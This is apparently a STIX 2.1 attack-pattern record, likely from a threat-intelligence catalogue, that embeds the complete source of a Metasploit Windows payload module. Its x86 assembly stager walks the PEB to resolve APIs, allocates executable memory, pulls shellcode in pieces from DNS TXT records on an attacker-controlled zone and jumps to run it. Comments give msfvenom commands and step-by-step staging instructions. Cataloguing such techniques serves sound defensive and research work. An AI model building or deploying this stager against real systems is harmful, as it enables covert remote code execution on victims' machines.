{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c18cefa-e824-4411-a7a4-252549d387fb",
    "created": "2024-08-14T16:33:19.374493Z",
    "modified": "2024-08-14T16:33:19.374497Z",
    "name": "DNS TXT Record Payload Download and Execution",
    "description": "Performs a TXT query against a series of DNS record(s) and executes the returned payload",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/windows/dns_txt_query_exec.rb",
            "external_id": "dns_txt_query_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 285\n\n  include Msf::Payload::Windows\n  include Msf::Payload::Single\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'DNS TXT Record Payload Download and Execution',\n      'Description'   => 'Performs a TXT query against a series of DNS record(s) and executes the returned payload',\n      'Author'        =>\n        [\n          'corelanc0d3r <peter.ve[at]corelan.be>'\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86\n    ))\n\n    # EXITFUNC is not supported\n    deregister_options('EXITFUNC')\n\n    # Register command execution options\n    register_options(\n      [\n        OptString.new('DNSZONE', [ true, \"The DNS zone to query\" ]),\n      ])\n  end\n\n  #\n  # Usage :\n  # 1. Generate the shellcode you want to deliver via DNS TXT queries\n  #    Make sure the shellcode is alpha_mixed or alpha_upper and uses EDI as bufferregister\n  #    Example :\n  #   ./msfvenom -p windows/messagebox TITLE=\"Friendly message from corelanc0d3r\" TEXT=\"DNS Payloads FTW\" -e x86/alpha_mixed Bufferregister=EDI -f raw\n  #    Output : 658 bytes\n  # 2. Split the alpha shellcode into individual parts of exactly 255 bytes (+ remaining bytes)\n  #    In case of 658 bytes of payload, there will be 2 parts of 255 bytes, and one part of 144 bytes\n  # 3. Create TXT records in a zone you control and put in a piece of the shellcode in each TXT record\n  #    The last TXT record might have less than 255 bytes, that's fine\n  #    The first part must be stored in the TXT record for prefix a.<yourdomain.com>\n  #    The second part must be stored in the TXT record for b.<yourdomain.com>\n  #    etc\n  #    First part must start with a.  and all parts must be placed in consecutive records\n  # 4. use the dns_txt_query payload in the exploit, specify the name of the DNS zone that contains the DNS TXT records\n  #    Example: ./msfvenom -p windows/dns_txt_query_exec DNSZONE=corelan.eu -f c\n  #    (Example will show a messagebox)\n  #\n  # DNS TXT Records :\n  # a.corelan.eu\t: contains first 255 bytes of the alpha shellcode\n  # b.corelan.eu\t: contains the next 255 bytes of the alpha shellcode\n  # c.corelan.eu\t: contains the last 144 bytes of the alpha shellcode\n\n  def generate(_opts = {})\n\n    dnsname\t\t= datastore['DNSZONE']\n    wType\t\t= 0x0010\t#DNS_TYPE_TEXT (TEXT)\n    wTypeOffset\t= 0x1c\n\n    queryoptions\t= 0x248\n      # DNS_QUERY_RETURN_MESSAGE (0x200)\n      # DNS_QUERY_BYPASS_CACHE (0x08)\n      # DNS_QUERY_NO_HOSTS_FILE (0x40)\n      # DNS_QUERY_ONLY_TCP (0x02) <- not used atm\n\n    bufferreg \t= \"edi\"\n\n    #create actual payload\n    payload_data = <<EOS\n  cld\t\t\t; clear direction flag\n  call start\t\t; start main routine\n; Stephen Fewer's block_api\n; block_api code (Stephen Fewer)\napi_call:\n  pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.\n  mov ebp, esp           ; Create a new stack frame\n  xor edx, edx           ; Zero EDX\n  mov edx, fs:[edx+48]   ; Get a pointer to the PEB\n  mov edx, [edx+12]      ; Get PEB->Ldr\n  mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list\nnext_mod:\n  mov esi, [edx+40]      ; Get pointer to modules name (unicode string)\n  movzx ecx, word [edx+38] ; Set ECX to the length we want to check\n  xor edi, edi           ; Clear EDI which will store the hash of the module name\nloop_modname:            ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the name\n  cmp al, 'a'            ; Some versions of Windows use lower case module names\n  jl not_lowercase       ;\n  sub al, 0x20           ; If so normalise to uppercase\nnot_lowercase:           ;\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  loop loop_modname      ; Loop until we have read enough\n  ; We now have the module hash computed\n  push edx               ; Save the current position in the module list for later\n  push edi               ; Save the current module hash for later\n  ; Proceed to iterate the export address table,\n  mov edx, [edx+16]      ; Get this modules base address\n  mov eax, [edx+60]      ; Get PE header\n  add eax, edx           ; Add the modules base address\n  mov eax, [eax+120]     ; Get export tables RVA\n  test eax, eax          ; Test if no export address table is present\n  jz get_next_mod1       ; If no EAT present, process the next module\n  add eax, edx           ; Add the modules base address\n  push eax               ; Save the current modules EAT\n  mov ecx, [eax+24]      ; Get the number of function names\n  mov ebx, [eax+32]      ; Get the rva of the function names\n  add ebx, edx           ; Add the modules base address\n  ; Computing the module hash + function hash\nget_next_func:           ;\n  jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module\n  dec ecx                ; Decrement the function name counter\n  mov esi, [ebx+ecx*4]   ; Get rva of next module name\n  add esi, edx           ; Add the modules base address\n  xor edi, edi           ; Clear EDI which will store the hash of the function name\n  ; And compare it to the one we want\nloop_funcname:           ;\n  xor eax, eax           ; Clear EAX\n  lodsb                  ; Read in the next byte of the ASCII function name\n  ror edi, 13            ; Rotate right our hash value\n  add edi, eax           ; Add the next byte of the name\n  cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)\n  jne loop_funcname      ; If we have not reached the null terminator, continue\n  add edi, [ebp-8]       ; Add the current module hash to the function hash\n  cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for\n  jnz get_next_func      ; Go compute the next function hash if we have not found it\n  ; If found, fix up stack, call the function and then value else compute the next one...\n  pop eax                ; Restore the current modules EAT\n  mov ebx, [eax+36]      ; Get the ordinal table rva\n  add ebx, edx           ; Add the modules base address\n  mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal\n  mov ebx, [eax+28]      ; Get the function addresses table rva\n  add ebx, edx           ; Add the modules base address\n  mov eax, [ebx+4*ecx]   ; Get the desired functions RVA\n  add eax, edx           ; Add the modules base address to get the functions actual VA\n  ; We now fix up the stack and perform the call to the desired function...\nfinish:\n  mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad\n  pop ebx                ; Clear off the current modules hash\n  pop ebx                ; Clear off the current position in the module list\n  popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered\n  pop ecx                ; Pop off the origional return address our caller will have pushed\n  pop edx                ; Pop off the hash value our caller will have pushed\n  push ecx               ; Push back the correct return value\n  jmp eax                ; Jump into the required function\n  ; We now automagically return to the correct caller...\nget_next_mod:            ;\n  pop eax                ; Pop off the current (now the previous) modules EAT\nget_next_mod1:           ;\n  pop edi                ; Pop off the current (now the previous) modules hash\n  pop edx                ; Restore our position in the module list\n  mov edx, [edx]         ; Get the next module\n  jmp.i8 next_mod        ; Process this module\n\n; actual routine\nstart:\n  pop ebp\t\t\t; get ptr to block_api routine\n\n; first allocate some space in heap to hold payload\nalloc_space:\n  xor eax,eax\t\t; clear EAX\n  push 0x40\t\t; flProtect (RWX)\n  mov ah,0x10\t\t; set EAX to 0x1000 (should be big enough to hold up to 26 * 255 bytes)\n  push eax\t\t; flAllocationType MEM_COMMIT (0x1000)\n  push eax\t\t; dwSize (0x1000)\n  push 0x0\t\t; lpAddress\n  push 0xE553A458        \t; kernel32.dll!VirtualAlloc\n  call ebp\n  push eax\t\t; save pointer on stack, will be used in memcpy\n  mov #{bufferreg}, eax\t; save pointer, to jump to at the end\n\n\n;load dnsapi.dll\nload_dnsapi:\n  xor eax,eax\t\t; put part of string (hex) in eax\n  mov al,0x70\n  mov ah,0x69\n  push eax        \t; Push 'dnsapi' to the stack\n  push 0x61736e64        \t; ...\n  push esp               \t; Push a pointer to the 'dnsapi' string on the stack.\n  push 0x0726774C        \t; kernel32.dll!LoadLibraryA\n  call ebp               \t; LoadLibraryA( \"dnsapi\" )\n\n;prepare for loop of queries\n  mov bl,0x61\t\t; first query, start with 'a'\n\ndnsquery:\n  jmp.i8 get_dnsname\t; get dnsname\n\nget_dnsname_return:\n  pop eax\t\t\t; get ptr to dnsname (lpstrName)\n  mov [eax],bl\t\t; patch sequence number in place\n  xchg esi,ebx\t\t; save sequence number\n  push esp\t\t; prepare ppQueryResultsSet\n  pop ebx\t\t\t;   (put ptr to ptr to stack on stack)\n  sub ebx,4\n  push ebx\n  push 0x0\t\t; pReserved\n  push ebx\t\t; ppQueryResultsSet\n  push 0x0\t\t; pExtra\n  push #{queryoptions}\t; Options\n  push #{wType}\t\t; wType\n  push eax\t\t; lpstrName\n  push 0xC99CC96A \t; dnsapi.dll!DnsQuery_A\n  call ebp\t\t;\n  test eax, eax\t\t; query ok ?\n  jnz jump_to_payload\t; no, jump to payload\n  jmp.i8 get_query_result\t; eax = 0 : a piece returned, fetch it\n\n\nget_dnsname:\n  call get_dnsname_return\n  db \"a.#{dnsname}\", 0x00\n\nget_query_result:\n  xchg #{bufferreg},edx\t; save start of heap\n  pop #{bufferreg}\t; heap structure containing DNS results\n  mov eax,[#{bufferreg}+0x18]\t; check if value at offset 0x18 is 0x1\n  cmp eax,1\n  jne prepare_payload\t; jmp to payload\n  add #{bufferreg},#{wTypeOffset}\t; get ptr to ptr to DNS reply\n  mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply\n\ncopy_piece_to_heap:\n  xchg ebx,esi\t\t; save counter\n  mov esi,edi\t\t; set source\n  mov edi,[esp+0x8]\t; retrieve heap destination for memcpy\n  xor ecx,ecx\t\t; clear ecx\n  mov cl,0xff\t\t; always copy 255 bytes, no matter what\n  rep movsb\t\t; copy from ESI to EDI\n  push edi\t\t; save target for next copy\n  push edi\t\t; 2 more times to make sure it's at esp+8\n  push edi\t\t;\n  inc ebx\t\t\t; increment sequence\n  xchg #{bufferreg},edx\t; restore start of heap\n  jmp.i8 dnsquery\t        ; try to get the next piece, if any\n\nprepare_payload:\n  mov #{bufferreg},edx\n\njump_to_payload:\n  jmp #{bufferreg}\t; jump to it\n\n\n\nEOS\n    self.assembly = payload_data\n    super\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}